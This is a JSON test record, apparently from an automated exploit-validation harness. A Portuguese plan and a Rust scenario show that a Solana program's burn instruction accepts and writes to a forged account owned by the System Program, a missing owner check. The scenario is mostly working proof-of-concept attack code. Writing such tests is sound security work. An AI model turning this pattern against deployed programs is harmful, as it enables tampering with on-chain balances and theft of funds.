{
  "plan": "O atacante cria uma conta forjada cujo owner e o System Program (nao o programa-alvo), com dados de 56 bytes onde os campos supply (offset 40) e balance (offset 48) sao controlados pelo atacante. O baseline usa a instrucao burn legitimamente sobre uma conta cujo owner e o program_id, provando que o cenario esta montado corretamente. O ataque chama burn com a mesma quantidade, mas passando a conta forjada como accounts[0], cujo owner difere do baseline. O efeito mede que os bytes 40..56 da conta forjada foram alterados pela instrucao, demonstrando que o programa aceitou e gravou em uma conta que nao lhe pertence.",
  "scenario": "let program_id = env.program_id;

// Conta legitima: owner = program_id, com supply=1000, balance=500 nos offsets 40 e 48
let mut legit_data = vec![0u8; 56];
legit_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
legit_data[48..56].copy_from_slice(&500u64.to_le_bytes());
let legit_account = account(&program_id, &legit_data, None);

// Conta forjada: owner = System Program (diferente do program_id), dados controlados pelo atacante
let mut forged_data = vec![0u8; 56];
forged_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
forged_data[48..56].copy_from_slice(&500u64.to_le_bytes());
let forged_account = account(&solana_sdk::system_program::id(), &forged_data, None);

let amount: u64 = 100;
let ix_data = [IX_BURN, amount.to_le_bytes().as_ref()].concat();

// Baseline: burn legitimo sobre a conta com owner correto
let ix_baseline = env.raw_ix(&ix_data, &[AccountMeta::new(legit_account_key, false)]);
let contas_baseline = vec![(legit_account_key, legit_account.clone())];
let r_base = env.baseline("burn legitimo sobre conta do programa", &ix_baseline, &contas_baseline);

// Ataque: burn sobre a conta forjada (owner diferente)
let ix_attack = env.raw_ix(&ix_data, &[AccountMeta::new(forged_account_key, false)]);
let contas_attack = vec![(forged_account_key, forged_account.clone())];
let r = env.attack("burn sobre conta forjada com owner diferente", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let after_data = after(&r, &forged_account_key).data();
    let new_supply = read_u64(after_data, 40);
    let new_balance = read_u64(after_data, 48);
    env.effect("supply da conta forjada foi decrementado pela instrucao", new_supply == 900);
    env.effect("balance da conta forjada foi decrementado pela instrucao", new_balance == 400);
}"
}

